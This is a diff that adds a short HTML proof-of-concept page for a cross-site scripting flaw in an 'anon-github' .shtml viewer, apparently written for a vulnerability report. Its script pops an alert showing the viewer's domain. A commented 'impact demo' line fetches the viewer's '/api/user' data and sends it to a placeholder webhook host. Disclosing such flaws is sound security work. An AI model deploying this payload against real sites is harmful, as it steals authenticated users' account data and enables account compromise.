@@ -1,0 +1,10 @@
+<!doctype html>
+<html><body>
+<h3>anon-github shtml XSS PoC</h3>
+<script>
+  // Proof: runs on the viewer origin (no CSP, not sandboxed)
+  alert('F2 shtml XSS on ' + document.domain);
+  // Impact demo (same-origin, authenticated as the viewer):
+  // fetch('/api/user').then(r=>r.text()).then(t=>fetch('https://YOUR-WEBHOOK/?u='+encodeURIComponent(t)));
+</script>
+</body></html>
